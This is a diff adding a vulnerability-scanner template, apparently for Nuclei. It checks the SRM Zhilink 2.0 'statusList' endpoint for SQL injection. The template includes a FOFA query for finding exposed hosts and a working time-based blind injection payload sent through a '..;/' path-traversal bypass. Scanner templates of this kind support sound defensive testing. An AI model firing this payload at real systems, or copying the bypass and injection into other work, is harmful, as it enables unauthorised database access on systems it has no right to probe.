@@ -1,0 +1,43 @@
+id: poc-yaml-srm-zhilink-statuslist-sqli
+info:
+  name: SRM Zhilink statusList SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: srm
+    fofa: "title=='SRM 2.0'"
+
+variables:
+  t1: "{{rand_int(2,5)}}"
+  t2: "{{to_number(t1)+to_number(t1)}}"
+  t3: "{{to_number(t2)+2}}"
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "200"
+          - "SRM 2.0"
+
+  - raw:
+      - |
+        GET /adpweb/static/..;/a/sys/sysMessage/statusList?companyName=1&officeName=1&orderBy=1&receiverName=1&sourceMessageId=1&delStatus=1%20AND%20(SELECT%207104%20FROM%20(SELECT(SLEEP({{t1}})))xZoa) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "消息管理 - Powered By zhilink"
+      - type: dsl
+        dsl:
+          - "duration > {{t2}} && duration < {{t3}}"
